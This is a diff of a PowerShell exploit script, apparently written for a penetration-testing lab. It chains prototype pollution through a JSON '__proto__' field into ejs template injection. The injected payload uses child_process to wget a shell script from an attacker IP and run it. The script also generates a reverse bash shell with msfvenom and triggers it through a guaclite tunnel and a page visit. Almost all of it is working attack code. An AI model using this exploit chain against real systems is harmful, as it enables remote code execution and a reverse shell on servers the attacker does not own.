@@ -46,22 +46,30 @@ $json_obj = @{
       "console"="false";
       "initial-program"="";
       "__proto__" = @{
-#        "outputFunctionName" = "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); y";
-#"outputFunctionName" = "x=1; process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.210/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &'); y"
-          "outputFunctionName" =  "x=1; $shell; y"
+          "outputFunctionName" = "x=1; process.mainModule.require('child_process').execSync('/usr/bin/wget http://192.168.119.154/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; sh /tmp/shell.sh &'); y"
         }
     }
   }
 }
+# pollute the outputFunctionName variable in ejs
 $json = convertto-json $json_obj -depth 4
 $res = Invoke-WebRequest -Uri "http://$machine/token" -method Post -body $json -ContentType 'application/json' -SkipHttpErrorCheck
 $res_content = ConvertFrom-Json $res.Content
 Write-Output "rdp token: $($res_content.token)
 "
-$status = python trigger_guaclite_tunnel.py --token $res_content.token
+# The guaclite tunnel is triggered by the /rdp endpoint but it uses window.location.search to populate the rdp token for the guaclite tunnel so we use selenium + headless firefox to "proxy" a connection over the guaclite tunnel.
+$status = python trigger-guaclite-tunnel.py --token $res_content.token
 Write-Host "Status: $status"
 
+# generate shellcode
+msfvenom -p cmd/unix/reverse_bash lhost=192.168.119.154 lport=4444 -f raw -o shell.sh
 
-<#
-The last part would be to visit any page of the wep application to activate the shell
-#>
+#The last part would be to visit any page of the web application to activate the shell, seems like this must be done from a browser as well.
+#iwr -Uri http://chips/ -SkipHttpErrorCheck
+Start-Job -ScriptBlock { python visit-page.py }
+
+Write-Output "Sleep for payload request ..."
+Start-Sleep -Seconds 5
+
+# cleanup
+Remove-Item shell.sh
